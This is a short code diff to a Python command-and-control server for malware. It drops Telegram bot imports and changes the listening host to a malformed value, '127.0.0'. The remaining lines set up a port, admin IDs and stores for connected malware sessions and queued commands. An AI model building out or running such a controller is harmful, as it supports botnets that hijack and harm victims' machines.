@@ -6,20 +6,10 @@ import struct
 import time
 import traceback
 from typing import Dict, List, Callable, Optional
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    ContextTypes,
-    ConversationHandler,
-    MessageHandler,
-    CallbackQueryHandler,
-    filters
-)
 
 # --- C2 Configuration ---
 C2_PORT = 4444
-C2_HOST = "0.0.0.0"
+C2_HOST = "127.0.0"
 ADMIN_IDS = [123456789, 987654321] # Replace with real Admin's IDs
 ACTIVE_BOTS: Dict[str, Dict] = {}  # Stores connected malware instances {session_id: {ip, host, timestamp, last_active}}
 COMMAND_QUEUE: Dict[str, List[str]] = {}  # Stores pending commands per session
